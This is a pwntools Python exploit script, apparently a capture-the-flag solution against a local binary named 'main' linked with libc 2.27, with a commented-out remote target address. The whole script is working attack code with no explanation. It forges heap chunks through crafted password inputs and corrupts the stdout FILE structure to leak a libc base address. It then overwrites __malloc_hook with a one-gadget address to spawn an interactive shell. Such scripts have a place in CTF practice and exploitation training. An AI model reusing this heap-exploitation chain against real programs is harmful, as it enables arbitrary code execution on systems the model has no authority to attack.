from pwn import*
#context.log_level = 'DEBUG'
p = process('./main')
libc =ELF('./libc-2.27.so')
#p = remote('172.20.120.104',8888)
p.sendlineafter('Username:',"adminNNN" + 'N'*0x10 + '\x31')
p.sendafter('Password:','p455w0rd' + '\x00'*0x8 + 'U'*0x8F)

p.sendlineafter('choice:','1')
p.sendlineafter('password:','\x00'*0x28 + p64(0x21) + 'U'*0x50 + p64(0x6032D0 + 0x10))
p.sendlineafter('please:','F'*0x70)
p.sendlineafter(':','1000')
p.sendlineafter('choice:','1')
p.sendlineafter('password:',p64(0x603288))
p.sendlineafter('please:','F'*0x20)
p.sendlineafter(':','1000')

p.sendlineafter('choice:','1')
p.sendlineafter('password:',p64(0x603288))
p.sendafter('please:',p64(0x603288)*4)
p.sendlineafter(':','1000')
p.sendlineafter('choice:','1')
p.sendlineafter('password:',p64(0x603288))
p.sendafter('please:',p64(0xFBAD1800) + p64(0)*3  + '\xC8')
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
log.info('LIBC:\t' + hex(libc_base))
p.sendlineafter(':','1000')

p.sendlineafter('choice:','1')
p.sendlineafter('password:','FMYY')
p.sendlineafter('please:','F'*0x70)
p.sendlineafter(':','1000')

malloc_hook = libc_base + libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
rce = libc_base + 0x10A45C
p.sendlineafter('choice:','1')
p.sendlineafter('password:','\x00'*0x28 + p64(0x41) + 'U'*0x50 + p64(0x603300 + 0x10))
p.sendlineafter('please:','F'*0x70)
p.sendlineafter(':','1000')
p.sendlineafter('choice:','1')
p.sendlineafter('password:','\x00'*0x30 + p64(malloc_hook))
p.sendlineafter('please:','F'*0x30)
p.sendlineafter(':','1000')
p.sendlineafter('choice:','1')
p.sendlineafter('password:','FMYY')
p.sendlineafter('please:',p64(rce) + '\x00'*0x28)
p.sendlineafter(':','1000')
p.sendlineafter('choice:','1')
p.sendlineafter('password:','FMYY')
p.interactive()
